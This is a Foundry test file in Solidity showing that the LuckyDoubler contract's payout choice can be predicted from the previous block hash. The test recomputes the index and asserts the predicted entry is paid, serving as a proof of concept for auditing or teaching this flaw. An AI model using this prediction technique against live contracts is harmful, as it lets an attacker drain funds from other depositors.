
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {LuckyDoubler} from "../src/LuckyDoubler.sol";

contract TestWeakRandomnessLuckyDoubler is Test {
    LuckyDoubler private luckyDoubler;
    uint256 constant FACTOR = 1157920892373161954235709850086879078532699846656405640394575840079131296399;

    function setUp() public {
        luckyDoubler = new LuckyDoubler();
    }

    function test_highlightPredictableRandomValue(uint256 blockNumber) public {
        vm.assume(blockNumber > 0 && blockNumber < 256);
        
        uint256 hashVal = uint256(blockhash(blockNumber - 1));
        vm.assume(hashVal > 0);
        
        vm.deal(address(1), 2 ether);
        vm.deal(address(2), 2 ether);
        
        vm.roll(blockNumber);
        
        vm.prank(address(1));
        (bool success1, ) = address(luckyDoubler).call{value: 1 ether}("");
        require(success1, "First deposit failed");
        
        uint256 max = 2;
        uint256 factor = FACTOR * 100 / max;
        uint256 predictedIndex = uint256((hashVal / factor)) % max;
        
        vm.roll(blockNumber + 1);
        bytes32 nextBlockHash = blockhash(blockNumber);
        
        vm.prank(address(2));
        (bool success2, ) = address(luckyDoubler).call{value: 1 ether}("");
        require(success2, "Second deposit failed");
        
        bool paidEntry0;
        bool paidEntry1;
        
        ( , , paidEntry0, ) = luckyDoubler.entryDetails(0);
        ( , , paidEntry1, ) = luckyDoubler.entryDetails(1);
        
        if (predictedIndex == 0) {
            assertTrue(paidEntry0, "Entry at predicted index 0 should be paid");
            assertFalse(paidEntry1, "Entry at index 1 should not be paid");
        } else {
            assertFalse(paidEntry0, "Entry at index 0 should not be paid");
            assertTrue(paidEntry1, "Entry at predicted index 1 should be paid");
        }
    }
}
